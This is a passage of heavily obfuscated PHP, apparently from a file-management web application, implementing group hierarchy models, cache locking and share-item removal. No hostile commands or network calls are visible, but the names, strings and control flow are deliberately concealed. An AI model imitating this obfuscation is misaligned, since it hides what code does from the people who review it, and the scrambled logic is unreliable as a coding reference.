(!$¾“’ŠÚ¥) { $ªµ¿Ë¨ˆ->stop($›ÚÙò…¥); return !1; } $ªµ¿Ë¨ˆ->end(); if ($ğ…ô´Û¦ == $ª¼Ì÷õï[1830]) { $this->remove($ÙÊ¿òÔä); } } public function progress($ç¶”Âºö, $É…å®¬ë) { return Task::get($É…å®¬ë . $_SERVER[Îûáû“ş][2190] . $ç¶”Âºö); } private function removeByFileID($şòßÔ”ç = array()) { $µ‡€÷² =& $_SERVER[Îûáû“ş]; if (empty($şòßÔ”ç)) { return; } $–â€ñ€× = array($µ‡€÷²[468] => array($µ‡€÷²[7], $şòßÔ”ç)); $§â¿«Öİ = Model($µ‡€÷²[1341])->where($–â€ñ€×)->field($µ‡€÷²[402])->select(); if (!$§â¿«Öİ) { return; } $§â¿«Öİ = array_to_keyvalue($§â¿«Öİ, $µ‡€÷²[12], $µ‡€÷²[402]); foreach ($§â¿«Öİ as $˜ø½œùñ) { Model($µ‡€÷²[416])->removeNow($˜ø½œùñ, !1); } } private function removeShareItems($”Ùõ·Ñ¬) { $²Î‚¼èÎ =& $_SERVER[Îûáû“ş]; $ë‰š‹×Î = "\x7b\x69\157\72{$”Ùõ·Ñ¬}\175\x2f"; $õÛïŸäÍ = array($²Î‚¼èÎ[402] => 0, $²Î‚¼èÎ[1177] => array($²Î‚¼èÎ[383], "{$ë‰š‹×Î}\x25")); $¿ãˆ²“ = Model($²Î‚¼èÎ[1841])->where($õÛïŸäÍ)->field($²Î‚¼èÎ[593])->select(); if (empty($¿ãˆ²“)) { return; } $©İê˜—™ = array_to_keyvalue($¿ãˆ²“, $²Î‚¼èÎ[12], $²Î‚¼èÎ[593]); Model($²Î‚¼èÎ[592])->remove($©İê˜—™); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x4c\x69\147\150\x74\101\x70\160"; public $modelType = "\x53\x79\x73\164\145\155\x4f\x70\164\151\157\x6e"; public $field = array("\156\x61\155\145", "\147\162\x6f\165\160", "\144\145\163\x63", "\143\157\x6e\164\145\x6e\x74"); public function listData($­ÑğÀ¢Ø = false, $ÍéîĞ = "\155\x6f\144\151\146\x79\124\151\155\145", $­ı¬ØäĞ = true) { return parent::listData($­ÑğÀ¢Ø, $ÍéîĞ, $­ı¬ØäĞ); } public function remove($æ‚ÚÎ×¨) { $÷Ü²·¬Ş = $this->findByName($æ‚ÚÎ×¨); if (!$÷Ü²·¬Ş) { return !1; } return parent::remove($÷Ü²·¬Ş[$_SERVER[Îûáû“ş][399]]); } public function add($¦¡Å€Ö£) { if ($this->findByName($¦¡Å€Ö£[$_SERVER[Îûáû“ş][32]])) { return !1; } return parent::insert($¦¡Å€Ö£); } public function update($Øõ¶æÖô, $Ãåï…í) { $ì’Áúú¦ =& $_SERVER[Îûáû“ş]; $ºå¨ş€Ğ = $this->findByName($Øõ¶æÖô); $­ïãğ¸† = $this->findByName($Ãåï…í[$ì’Áúú¦[32]]); if (!$ºå¨ş€Ğ || $­ïãğ¸† && $­ïãğ¸†[$ì’Áúú¦[399]] != $ºå¨ş€Ğ[$ì’Áúú¦[399]]) { return !1; } return parent::update($ºå¨ş€Ğ[$ì’Áúú¦[399]], $Ãåï…í); } } goto bîº¾Ç”‚¯; aƒßÇêÁ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $„¶¸à‹Í =& $_SERVER[Îûáû“ş]; $­Ç½Ó˜Ã = $GLOBALS[$„¶¸à‹Í[6]][$„¶¸à‹Í[349]]; self::$cachePath = $­Ç½Ó˜Ã[$„¶¸à‹Í[200]][$„¶¸à‹Í[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ è·ï›€, $ñÑ®§Ù = 0) { $ĞºÆ©î¤ =& $_SERVER[Îûáû“ş]; $Çìåå™ = microtime(!0); $¤µ¶©Íù = $Çìåå™ + $ñÑ®§Ù + 0.0001; $ºé’©¬î = rtrim(self::$cachePath, $ĞºÆ©î¤[8]) . $ĞºÆ©î¤[862] . md5($ è·ï›€) . $ĞºÆ©î¤[859]; if (file_exists($ºé’©¬î) && filemtime($ºé’©¬î) && filemtime($ºé’©¬î) < time() - 10) { @unlink($ºé’©¬î); } do { if (file_exists($ºé’©¬î)) { cacheLockWait(); continue; } $Åæí· Ò = fopen($ºé’©¬î, $ĞºÆ©î¤[863]); if (!$Åæí· Ò) { return !1; } $Ù‡å›’ = flock($Åæí· Ò, LOCK_EX | LOCK_NB); self::$caches[$ è·ï›€] = array($ĞºÆ©î¤[864] => $Åæí· Ò, $ĞºÆ©î¤[200] => $ºé’©¬î); fwrite($Åæí· Ò, $¤µ¶©Íù); clearstatcache(); if ($Åæí· Ò && $Ù‡å›’) { return !0; } cacheLockWait(); } while (microtime(!0) < $¤µ¶©Íù); $this->unlock($ è·ï›€); return !1; } public function lockGet($şö¢û¸) { $™¥ŸÀã¸ =& $_SERVER[Îûáû“ş]; $Ö»…©¥° = rtrim(self::$cachePath, $™¥ŸÀã¸[8]) . $™¥ŸÀã¸[862] . md5($şö¢û¸) . $™¥ŸÀã¸[859]; return file_exists($Ö»…©¥°); } public function unlock($®¤£‰„ò) { $Åƒèãî =& $_SERVER[Îûáû“ş]; $å¸ïÎô® = self::$caches[$®¤£‰„ò]; if (!$å¸ïÎô®) { return; } @flock($å¸ïÎô®[$Åƒèãî[864]], LOCK_UN); @fclose($å¸ïÎô®[$Åƒèãî[864]]); @unlink($å¸ïÎô®[$Åƒèãî[200]]); unset(self::$caches[$®¤£‰„ò]); } } class CacheLockRedis { public function lock($äÆäÊª, $’Ñ¹–¦¼ = 10) { $Šøö¡Ò = Cache::init(); $ş©¤“¾› = microtime(!0) + $’Ñ¹–¦¼; while (microtime(!0) < $ş©¤“¾›) { $·¼‰„³ = $Šøö¡Ò->get($äÆäÊª); if (!$·¼‰„³) { $şÕ»§–æ = $Šøö¡Ò->setLock($äÆäÊª, $ş©¤“¾›, $’Ñ¹–¦¼); if ($şÕ»§–æ) { return !0; } } else { if ($·¼‰„³ < microtime(!0)) { $Šøö¡Ò->set($äÆäÊª, $ş©¤“¾›, $’Ñ¹–¦¼ * 2); if ($Šøö¡Ò->get($äÆäÊª) === $·¼‰„³) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ò¥ª•œ) { return Cache::init()->get($Ò¥ª•œ); } public function unlock($¢Ò¾ŞÅ) { return Cache::init()->remove($¢Ò¾ŞÅ); } } class CacheLockMemcached { public function lock($ËØ‘¸Øå, $ğ‹ŸóŞ• = 0) { $¦°”¼½Ø = Cache::init(); $½ü³»ıã = microtime(!0) + $ğ‹ŸóŞ•; while (microtime(!0) < $½ü³»ıã) { $”ñÈÖÖ  = $¦°”¼½Ø->get($ËØ‘¸Øå); if (!$”ñÈÖÖ  || $”ñÈÖÖ  < microtime(!0)) { $”·Òôƒİ = $¦°”¼½Ø->handle->add($ËØ‘¸Øå, $½ü³»ıã, $ğ‹ŸóŞ•); if ($”·Òôƒİ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‹¶²“ä) { return Cache::init()->get($‹¶²“ä); } public function unlock($Ú«ÆÊ) { return Cache::init()->remove($Ú«ÆÊ); } } goto a„‰ê’õìØ; E¹É¤Ö ø: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\x70"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\155\x65" => "\147\x72\x6f\x75\x70\137\x6d\x65\164\141", "\155\145\x74\x61\x46\151\x65\x6c\144" => "\x67\162\157\165\160\111\104"); protected function cacheFunctionAlias($‘ÄêÑØÇ) { $‘á«‚ =& $_SERVER[Îûáû“ş]; return array($‘á«‚[1939] => array($‘ÄêÑØÇ[0], $‘á«‚[1940]), $‘á«‚[1941] => array($‘ÄêÑØÇ[0], $‘á«‚[1942])); } protected function getInfo($¿êÃºê, $ô‹ı­“º = false) { $ÇĞã¢•³ = $this->getInfoSimple($¿êÃºê); if (!$ÇĞã¢•³) { return !1; } if ($ô‹ı­“º) { return $this->_listDataApplyItem($ÇĞã¢•³); } return $this->cacheFunctionGet($_SERVER[Îûáû“ş][1943], $¿êÃºê); } protected function getInfoSimple($‘ì²åî©, $¯µ ç•† = false) { $Ÿîç– Ì =& $_SERVER[Îûáû“ş]; if ($¯µ ç•†) { $íÊ˜³ = array($Ÿîç– Ì[1861] => intval($‘ì²åî©)); $áäí—™¨ = $this->where($íÊ˜³)->find(); return is_array($áäí—™¨) ? $áäí—™¨ : array(); } return $this->cacheFunctionGet($Ÿîç– Ì[1944], $‘ì²åî©); } protected function groupAdd($¥¤èíä) { $µ·º»³Ş =& $_SERVER[Îûáû“ş]; if (!$¥¤èíä[$µ·º»³Ş[432]] && isset($¥¤èíä[$µ·º»³Ş[1861]]) && $¥¤èíä[$µ·º»³Ş[1861]] == 1) { if ($˜¿¸å…µ = $this->getInfoSimple($¥¤èíä[$µ·º»³Ş[1861]], !0)) { return $¥¤èíä[$µ·º»³Ş[1861]]; } } else { $˜¿¸å…µ = $this->getInfoSimple($¥¤èíä[$µ·º»³Ş[432]]); if (!$˜¿¸å…µ) { return !1; } } $ƒ¡Æ˜ñû = $µ·º»³Ş[521]; if ($˜¿¸å…µ[$µ·º»³Ş[511]]) { $ƒ¡Æ˜ñû = $˜¿¸å…µ[$µ·º»³Ş[511]] . $˜¿¸å…µ[$µ·º»³Ş[1861]] . $µ·º»³Ş[50]; } $­ìÚğÂ = array($µ·º»³Ş[420] => $this->groupNameAuto($¥¤èíä[$µ·º»³Ş[432]], $¥¤èíä[$µ·º»³Ş[32]]), $µ·º»³Ş[401] => $¥¤èíä[$µ·º»³Ş[432]], $µ·º»³Ş[580] => $ƒ¡Æ˜ñû, $µ·º»³Ş[1945] => $¥¤èíä[$µ·º»³Ş[1848]], $µ·º»³Ş[1946] => 0, $µ·º»³Ş[1865] => 0); if (isset($¥¤èíä[$µ·º»³Ş[1885]])) { $­ìÚğÂ[$µ·º»³Ş[1885]] = $¥¤èíä[$µ·º»³Ş[1885]]; } else { $Ÿè‡Á¬µ = $this->max($µ·º»³Ş[1885]); if (!$Ÿè‡Á¬µ) { $Ÿè‡Á¬µ = 0; } $­ìÚğÂ[$µ·º»³Ş[1885]] = $Ÿè‡Á¬µ + 1; } if (!empty($¥¤èíä[$µ·º»³Ş[1861]])) { $­ìÚğÂ[$µ·º»³Ş[1861]] = $¥¤èíä[$µ·º»³Ş[1861]]; } $ì•ˆîÍ” = $this->add($­ìÚğÂ); $this->setNamePinyin($ì•ˆîÍ”, $­ìÚğÂ[$µ·º»³Ş[32]]); if (isset($¥¤èíä[$µ·º»³Ş[1947]])) { $this->metaSet($ì•ˆîÍ”, array($µ·º»³Ş[1947] => $¥¤èíä[$µ·º»³Ş[1947]], $µ·º»³Ş[1948] => $¥¤èíä[$µ·º»³Ş[1948]])); unset($¥¤èíä[$µ·º»³Ş[1947]]); unset($¥¤èíä[$µ·º»³Ş[1948]]); } Model($µ·º»³Ş[1341])->groupRootAdd($ì•ˆîÍ”); $this->_clearCache($¥¤èíä[$µ·º»³Ş[432]]); return $ì•ˆîÍ”; } protected function groupEdit($†‘¿Â¿Ì, $÷èòşí) { $–×İµå† =& $_SERVER[Îûáû“ş]; $İïÏâïò = $this->getInfoSimple($†‘¿Â¿Ì); if (!$İïÏâïò) { return !1; } if (!empty($÷èòşí[$–×İµå†[432]])) { $ƒ»Ú”¹€ = $this->getInfoSimple($÷èòşí[$–×İµå†[432]]); if (!$ƒ»Ú”¹€) { return !1; } if ($İïÏâïò[$–×İµå†[1861]] == $ƒ»Ú”¹€[$–×İµå†[1861]]) { return !1; } if ($÷èòşí[$–×İµå†[432]] != $İïÏâïò[$–×İµå†[432]]) { if ($ƒ»Ú”¹€[$–×İµå†[511]] !== $İïÏâïò[$–×İµå†[511]] && strpos($ƒ»Ú”¹€[$–×İµå†[511]], $İïÏâïò[$–×İµå†[511]] . $İïÏâïò[$–×İµå†[1861]] . $–×İµå†[50]) === 0) { return !1; } $÷èòşí[$–×İµå†[580]] = $ƒ»Ú”¹€[$–×İµå†[511]] . $÷èòşí[$–×İµå†[432]] . $–×İµå†[50]; $this->_changeChildLevel($İïÏâïò, $ƒ»Ú”¹€); $this->_clearCache($ƒ»Ú”¹€[$–×İµå†[1861]]); $this->_clearCache($İïÏâïò[$–×İµå†[432]]); } } if (isset($÷èòşí[$–×İµå†[32]])) { $this->setNamePinyin($†‘¿Â¿Ì, $÷èòşí[$–×İµå†[32]]); } if (isset($÷èòşí[$–×İµå†[1947]])) { $this->metaSet($†‘¿Â¿Ì, array($–×İµå†[1947] => $÷èòşí[$–×İµå†[1947]], $–×İµå†[1948] => $÷èòşí[$–×İµå†[1948]])); unset($÷èòşí[$–×İµå†[1947]]); unset($÷èòşí[$–×İµå†[1948]]); } $this->_clearChildrenCache($İïÏâïò); return $this->where(array($–×İµå†[1949] => $†‘¿Â¿Ì))->save($÷èòşí); } private function _clearChildrenCache($¯Ğòüß¶) { $ßè¿¢ÕÏ =& $_SERVER[Îûáû“ş]; $·¦±ó ø = array($ßè¿¢ÕÏ[580] => array($ßè¿¢ÕÏ[540], $¯Ğòüß¶[$ßè¿¢ÕÏ[511]] . $¯Ğòüß¶[$ßè¿¢ÕÏ[1861]] . $ßè¿¢ÕÏ[541])); $íñ¸ùñ“ = $this->field($ßè¿¢ÕÏ[1861])->where($·¦±ó ø)->select(); foreach ($íñ¸ùñ“ as $ª®ôéÃ¡) { $this->_clearCache($ª®ôéÃ¡[$ßè¿¢ÕÏ[1861]]); } } private function _clearCache($Œí‚êãÃ) { $µº€ºıß =& $_SERVER[Îûáû“ş]; $this->cacheFunctionClear($µº€ºıß[1943], $Œí‚êãÃ); $this->cacheFunctionClear($µº€ºıß[1944], $Œí‚êãÃ); } private function _changeChildLevel($èóß¶Õ¸, $Ğ˜Ê¡£ï, $È¥œ…Âê = false) { $ßìóßµÓ =& $_SERVER[Îûáû“ş]; $ØÀù© = $èóß¶Õ¸[$ßìóßµÓ[511]] . $èóß¶Õ¸[$ßìóßµÓ[1861]] . $ßìóßµÓ[50]; $ı£¬¯È­ = $Ğ˜Ê¡£ï[$ßìóßµÓ[511]] . $Ğ˜Ê¡£ï[$ßìóßµÓ[1861]] . $ßìóßµÓ[50] . $èóß¶Õ¸[$ßìóßµÓ[1861]] . $ßìóßµÓ[50]; if ($È¥œ…Âê) { $ı£¬¯È­ = $Ğ˜Ê¡£ï[$ßìóßµÓ[511]] . $Ğ˜Ê¡£ï[$ßìóßµÓ[1861]] . $ßìóßµÓ[50]; } $Û©Â’§ˆ = array($ßìóßµÓ[580] => array($ßìóßµÓ[540], $èóß¶Õ¸[$ßìóßµÓ[511]] . $èóß¶Õ¸[$ßìóßµÓ[1861]] . $ßìóßµÓ[541])); $ï˜Ó‘»š = array($ßìóßµÓ[580] => array($ßìóßµÓ[589], "\x72\x65\x70\x6c\x61\143\145\x28\x70\141\162\145\x6e\164\x4c\145\x76\145\x6c\x2c\x27{$ØÀù©}\47\54\x27{$ı£¬¯È­}\47\51")); $this->_clearChildrenCache($èóß¶Õ¸); $this->where($Û©Â’§ˆ)->data($ï˜Ó‘»š)->save(); } public function setNamePinyin($ÆĞ«·áû, $„å‡©š– = false) { $¼ä¬±å =& $_SERVER[Îûáû“ş]; if (!$„å‡©š–) { $ò£²‚æ¾ = $this->getInfoSimple($ÆĞ«·áû); $„å‡©š– = $ò£²‚æ¾[$¼ä¬±å[32]]; } if (!Input::check($„å‡©š–, $¼ä¬±å[583])) { $this->metaSet($ÆĞ«·áû, $¼ä¬±å[465], null); $this->metaSet($ÆĞ«·áû, $¼ä¬±å[464], null); return; } $¸—áó³ô = array($¼ä¬±å[465] => str_replace($¼ä¬±å[53], $¼ä¬±å[12], Pinyin::get($„å‡©š–)), $¼ä¬±å[464] => Pinyin::get($„å‡©š–, $¼ä¬±å[584])); $this->metaSet($ÆĞ«·áû, $¸—áó³ô); } protected function groupStatus($Øšº‚Ş, $‘ç–ù³Œ) { $ÉÀ¿àÑ› =& $_SERVER[Îûáû“ş]; $ü¡ºõø« = $this->getInfoSimple($Øšº‚Ş); if (!$ü¡ºõø«) { return !1; } if ($‘ç–ù³Œ == $ÉÀ¿àÑ›[88]) { $ºƒ¹Õ = $this->parentLevelArray($ü¡ºõø«[$ÉÀ¿àÑ›[511]]); } else { $–œèÈšâ = array($ÉÀ¿àÑ›[580] => array($ÉÀ¿àÑ›[540], $ü¡ºõø«[$ÉÀ¿àÑ›[511]] . $ü¡ºõø«[$ÉÀ¿àÑ›[1861]] . $ÉÀ¿àÑ›[541])); $ºƒ¹Õ = $this->where($–œèÈšâ)->field($ÉÀ¿àÑ›[1861])->select(); $ºƒ¹Õ = array_to_keyvalue($ºƒ¹Õ, $ÉÀ¿àÑ›[12], $ÉÀ¿àÑ›[1861]); } $ºƒ¹Õ[] = $ü¡ºõø«[$ÉÀ¿àÑ›[1861]]; $«Îïµº = array(); foreach ($ºƒ¹Õ as $Øšº‚Ş) { $«Îïµº[] = array($ÉÀ¿àÑ›[1861] => $Øšº‚Ş, $ÉÀ¿àÑ›[94] => $ÉÀ¿àÑ›[748], $ÉÀ¿àÑ›[374] => $‘ç–ù³Œ); $this->_clearCache($Øšº‚Ş); } return Model($ÉÀ¿àÑ›[1950])->addAll($«Îïµº, array(), !0); } protected function groupRemove($Àåíæ³, $™‡¸¿õ = false) { $èŠáİÕ =& $_SERVER[Îûáû“ş]; $É„ÎƒÙ = array($èŠáİÕ[1861] => $Àåíæ³); $òš˜óéœ = $this->where($É„ÎƒÙ)->find(); if (!$òš˜óéœ || $òš˜óéœ[$èŠáİÕ[432]] == 0) { return !1; } if (!$™‡¸¿õ) { $ŸàéÅúí = $this->getInfoSimple($òš˜óéœ[$èŠáİÕ[432]]); $this->_changeChildLevel($òš˜óéœ, $ŸàéÅúí, !0); $this->where(array($èŠáİÕ[432] => $Àåíæ³))->save(array($èŠáİÕ[432] => $òš˜óéœ[$èŠáİÕ[432]])); $this->_clearCache($ŸàéÅúí[$èŠáİÕ[1861]]); } Model($èŠáİÕ[1950])->where($É„ÎƒÙ)->delete(); Model($èŠáİÕ[1951])->where($É„ÎƒÙ)->delete(); Model($èŠáİÕ[824])->groupRootRemove($Àåíæ³); $this->_clearCache($òš˜óéœ[$èŠáİÕ[432]]); return $this->where($É„ÎƒÙ)->delete(); } protected function groupSort($÷Ú›˜Îø) { $§›ßò›ü =& $_SERVER[Îûáû“ş]; $Ú°Š÷çÌ = array(); foreach ($÷Ú›˜Îø as $ä²ÄÇô => $”®¥‘¬Ğ) { $Ú°Š÷çÌ[] = array($§›ßò›ü[1861], $”®¥‘¬Ğ, $§›ßò›ü[1885], $ä²ÄÇô + 1); } $this->saveAll($Ú°Š÷çÌ); } public function listData() { $³ôéï÷¬ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($³ôéï÷¬[$_SERVER[Îûáû“ş][369]]); return $³ôéï÷¬; } private function _makeOrder($ğÎª÷é­ = '') { $ßÏÖ¿ó =& $_SERVER[Îûáû“ş]; $ÂéÇ‹£Ø = array($ßÏÖ¿ó[1861], $ßÏÖ¿ó[32], $ßÏÖ¿ó[1850], $ßÏÖ¿ó[201]); $“ˆ¡í = array($ßÏÖ¿ó[450] => $ßÏÖ¿ó[451], $ßÏÖ¿ó[452] => $ßÏÖ¿ó[453]); $ÚúÛ–ïş = Input::get($ßÏÖ¿ó[457], $ßÏÖ¿ó[7], $ßÏÖ¿ó[1865], $ÂéÇ‹£Ø); $ä¹şáò´ = Input::get($ßÏÖ¿ó[458], $ßÏÖ¿ó[7], $ßÏÖ¿ó[1952], array($ßÏÖ¿ó[1952], $ßÏÖ¿ó[452])); $ä¹şáò´ = $“ˆ¡í[$ä¹şáò´]; $ğÎª÷é­ = $ğÎª÷é­ . "{$ÚúÛ–ïş}\40{$ä¹şáò´}\54\x20\x67\x72\x6f\x75\x70\x49\104\x20\x61\163\x63"; return $this->order($ğÎª÷é­); } public function listChild($âÙòáÕ») { $«ÛÂ—ï± =& $_SERVER[Îûáû“ş]; $Æ¸¿çéä = $this->where(array($«ÛÂ—ï±[432] => $âÙòáÕ»))->_makeOrder()->selectPage(200); $this->_listDataApply($Æ¸¿çéä[$«ÛÂ—ï±[369]]); return $Æ¸¿çéä; } public function listChildIds($ÙÔÀ§ˆà) { $¤…Ô³ºğ =& $_SERVER[Îûáû“ş]; if (is_string($¢Õ«½Í)) { $ÙÔÀ§ˆà = explode($¤…Ô³ºğ[50], $ÙÔÀ§ˆà); } $ÁÚ©ÅŒ = $this->where(array($¤…Ô³ºğ[1861] => array($¤…Ô³ºğ[7], $ÙÔÀ§ˆà)))->field($¤…Ô³ºğ[1953])->select(); if (!$ÁÚ©ÅŒ) { return !1; } $ö˜ìü‚ = array(); foreach ($ÁÚ©ÅŒ as $¿„Æ¼è) { $ö˜ìü‚[] = "\x73\145\154\x65\143\164\x20\x67\162\x6f\x75\160\111\104\x20\x66\x72\x6f\x6d\40\140\147\162\157\x75\x70\x60\40\167\150\x65\162\x65\x20\160\x61\x72\145\156\x74\114\145\x76\145\154\40\x6c\x69\153\x65\40\x27{$¿„Æ¼è[$¤…Ô³ºğ[511]]}{$¿„Æ¼è[$¤…Ô³ºğ[1861]]}\x2c\x25\47"; } $ö˜ìü‚ = implode($¤…Ô³ºğ[1954], $ö˜ìü‚); $ÁÚ©ÅŒ = $this->query($ö˜ìü‚); if (!$ÁÚ©ÅŒ) { return array(); } $ÙÔÀ§ˆà = array_to_keyvalue($ÁÚ©ÅŒ, $¤…Ô³ºğ[12], $¤…Ô³ºğ[1861]); return array_unique($ÙÔÀ§ˆà); } public function listByID($İ•ÛÖı) { $¤£”Ã© =& $_SERVER[Îûáû“ş]; if (!$İ•ÛÖı) { return array(); } $ñå¢Çãî = array($¤£”Ã©[1861] => array($¤£”Ã©[7], $İ•ÛÖı)); $é£ì°š¤ = $this->where($ñå¢Çãî)->select(); $é£ì°š¤ = array_sort_keep($é£ì°š¤, $¤£”Ã©[1861], $İ•ÛÖı); $this->_listDataApply($é£ì°š¤); return $é£ì°š¤; } public function listSearch($©ß·Õ¿¶) { $±İ–…íø =& $_SERVER[Îûáû“ş]; $ïøºåØ³ = $©ß·Õ¿¶[$±İ–…íø[1955]]; $±‰˜ô = isset($©ß·Õ¿¶[$±İ–…íø[1956]]) ? $©ß·Õ¿¶[$±İ–…íø[1956]] : !1; if (!trim($ïøºåØ³)) { return !1; } $ïøºåØ³ = str_replace($±İ–…íø[1957], $±İ–…íø[1958], $ïøºåØ³); $Ø´„ÆÖÆ = array($±İ–…íø[1861] => array($±İ–…íø[383], "{$ïøºåØ³}\45"), $±İ–…íø[32] => array($±İ–…íø[383], "\x25{$ïøºåØ³}\45"), $±İ–…íø[1002] => $±İ–…íø[1959]); if ($±‰˜ô) { $¥–ãØû = $this->getInfoSimple($±‰˜ô); $Ÿ´Ö™¼à = $¥–ãØû[$±İ–…íø[511]] . $±‰˜ô . $±İ–…íø[541]; $Ø´„ÆÖÆ = array($Ø´„ÆÖÆ, array($±İ–…íø[511] => array($±İ–…íø[383], $Ÿ´Ö™¼à))); } $Ø´„ÆÖÆ = $this->parseWhereLike($Ø´„ÆÖÆ); $“œÔÛÂÙ = $this->_makeOrder()->where($Ø´„ÆÖÆ)->selectPage(20); $“œÔÛÂÙ = $“œÔÛÂÙ ? $“œÔÛÂÙ : array($±İ–…íø[369] => array(), $±İ–…íø[366] => array()); if (!$“œÔÛÂÙ || count($“œÔÛÂÙ[$±İ–…íø[369]]) < 5 && Input::check($ïøºåØ³, $±İ–…íø[318])) { $ø‹¹Ğáë = $this->groupChildrenAll($±‰˜ô); $òø‡º®Ã = $this->_searchFromMeta($±İ–…íø[464], $ïøºåØ³, 10, $ø‹¹Ğáë); $Í¸“ÁÇı = $this->_searchFromMeta($±İ–…íø[465], $ïøºåØ³, 10, $ø‹¹Ğáë); $²€Ñ¸ëó = array_merge($òø‡º®Ã, $Í¸“ÁÇı, $“œÔÛÂÙ[$±İ–…íø[369]]); $“œÔÛÂÙ[$±İ–…íø[369]] = array_unique_by_key($²€Ñ¸ëó, $±İ–…íø[1861]); $“œÔÛÂÙ[$±İ–…íø[366]][$±İ–…íø[367]] = count($“œÔÛÂÙ[$±İ–…íø[369]]); $“œÔÛÂÙ[$±İ–…íø[366]][$±İ–…íø[368]] = ceil($“œÔÛÂÙ[$±İ–…íø[366]][$±İ–…íø[367]] / $“œÔÛÂÙ[$±İ–…íø[366]][$±İ–…íø[363]]); } $this->_listDataApply($“œÔÛÂÙ[$±İ–…íø[369]]); return $“œÔÛÂÙ; } protected function groupChildrenAll($Ú¿•Ô€È) { $ùÉ›Â¼ú =& $_SERVER[Îûáû“ş]; if (!$Ú¿•Ô€È) { return !1; } if (is_string($Ú¿•Ô€È)) { $Ú¿•Ô€È = array($Ú¿•Ô€È); } $§Ôù¢¶ß = $Ú¿•Ô€È; foreach ($Ú¿•Ô€È as $ÌÑÏØÀû) { $ñ£õÄ¬Ê = $this->getInfoSimple($ÌÑÏØÀû); $áî§´şÄ = array($ùÉ›Â¼ú[511] => array($ùÉ›Â¼ú[383], $ñ£õÄ¬Ê[$ùÉ›Â¼ú[511]] . $ÌÑÏØÀû . $ùÉ›Â¼ú[541])); $ËÔšåÙÔ = $this->field($ùÉ›Â¼ú[1861])->where($áî§´şÄ)->select(); $§Ôù¢¶ß = array_merge($§Ôù¢¶ß, array_to_keyvalue($ËÔšåÙÔ, $ùÉ›Â¼ú[12], $ùÉ›Â¼ú[1861])); } return array_unique($§Ôù¢¶ß); } private function _searchFromMeta($ÁÉ÷ª°, $Ç§·˜Ìü, $«ª›À¸™, $›ÖÅğï) { $¼çÉ‡í =& $_SERVER[Îûáû“ş]; $Ç§·˜Ìü = strtolower($Ç§·˜Ìü); $àÏ¶Ì« = array($¼çÉ‡í[94] => $ÁÉ÷ª°, $¼çÉ‡í[374] => array($¼çÉ‡í[383], "\45{$Ç§·˜Ìü}\x25")); $àÏ¶Ì« = $this->parseWhereLike($àÏ¶Ì«); if ($›ÖÅğï) { $àÏ¶Ì«[$¼çÉ‡í[1861]] = array($¼çÉ‡í[7], $›ÖÅğï); } $éÃ›Œæœ = Model($¼çÉ‡í[1960])->where($àÏ¶Ì«)->limit($«ª›À¸™)->select(); if (!$éÃ›Œæœ) { return array(); } $éÃ›Œæœ = array_to_keyvalue($éÃ›Œæœ, $¼çÉ‡í[12], $¼çÉ‡í[1861]); $«¸èç—ì = $this->where(array($¼çÉ‡í[1949] => array($¼çÉ‡í[7], $éÃ›Œæœ)))->select(); if (!$«¸èç—ì) { return array(); } return $«¸èç—ì; } protected function _listDataApplyItem($÷ì†¸òã) { $ñ¤ì³ŸŸ = array($÷ì†¸òã); $this->_listDataApply($ñ¤ì³ŸŸ); return $ñ¤ì³ŸŸ[0]; } protected function _listDataApply(&$ğº›«§È) { $Ü¼”õö¼ =& $_SERVER[Îûáû“ş]; if (!$ğº›«§È) { return; } $°®¬¶Ñ = array_to_keyvalue($ğº›«§È, $Ü¼”õö¼[12], $Ü¼”õö¼[1861]); $this->_listAppendChildren($ğº›«§È); $this->_listAppendChildrenMember($ğº›«§È); $this->_listAppendMeta($ğº›«§È, $°®¬¶Ñ); $this->_listAppendParent($ğº›«§È); $this->_listAppendSourceRoot($ğº›«§È, $°®¬¶Ñ); } private function _listAppendChildren(&$ÂÑçú»‰) { $Îøœ˜Ê =& $_SERVER[Îûáû“ş]; $¨ğ¾Œá¤ = array_to_keyvalue($ÂÑçú»‰, $Îøœ˜Ê[12], $Îøœ˜Ê[1861]); $ÏËåğî = array($Îøœ˜Ê[432] => array($Îøœ˜Ê[7], $¨ğ¾Œá¤)); $µ˜¬¸¸ = array($Îøœ˜Ê[432], $Îøœ˜Ê[1961] => $Îøœ˜Ê[491]); $·“ïû„á = $this->field($µ˜¬¸¸)->where($ÏËåğî)->group($Îøœ˜Ê[432])->select(); $¨¿·úİ¡ = array_to_keyvalue($·“ïû„á, $Îøœ˜Ê[432], $Îøœ˜Ê[491]); foreach ($ÂÑçú»‰ as &$˜ˆ€Çã) { $¾ãë”ç¼ = $˜ˆ€Çã[$Îøœ˜Ê[1861]]; $˜ˆ€Çã[$Îøœ˜Ê[1962]] = isset($¨¿·úİ¡[$¾ãë”ç¼]) ? intval($¨¿·úİ¡[$¾ãë”ç¼]) : !1; } unset($˜ˆ€Çã); } private function _listAppendChildrenMember(&$Á§àƒˆƒ) { $Ÿøæ–âø =& $_SERVER[Îûáû“ş]; $¯ïŸö¦ô = array_to_keyvalue($Á§àƒˆƒ, $Ÿøæ–âø[12], $Ÿøæ–âø[1861]); $¥Ò˜¿Áƒ = array($Ÿøæ–âø[1861] => array($Ÿøæ–âø[7], $¯ïŸö¦ô)); $á£è’½‰ = array($Ÿøæ–âø[1861], $Ÿøæ–âø[1961] => $Ÿøæ–âø[491]); $Ş®Âš¸Ú = Model($Ÿøæ–âø[1951])->field($á£è’½‰)->where($¥Ò˜¿Áƒ)->group($Ÿøæ–âø[1861])->select(); $Ä¬¿ÁÖ = array_to_keyvalue($Ş®Âš¸Ú, $Ÿøæ–âø[1861], $Ÿøæ–âø[491]); foreach ($Á§àƒˆƒ as &$ñÆĞ‹Œê) { $™Ğêëß = $ñÆĞ‹Œê[$Ÿøæ–âø[1861]]; $ñÆĞ‹Œê[$Ÿøæ–âø[1963]] = isset($Ä¬¿ÁÖ[$™Ğêëß]) ? intval($Ä¬¿ÁÖ[$™Ğêëß]) : !1; } unset($ñÆĞ‹Œê); } private function _listAppendMeta(&$ÕıĞİò›, $œÄ™öî¸) { $Ø‡Ñ¤ÓÚ =& $_SERVER[Îûáû“ş]; $ÛíÌÔï‡ = 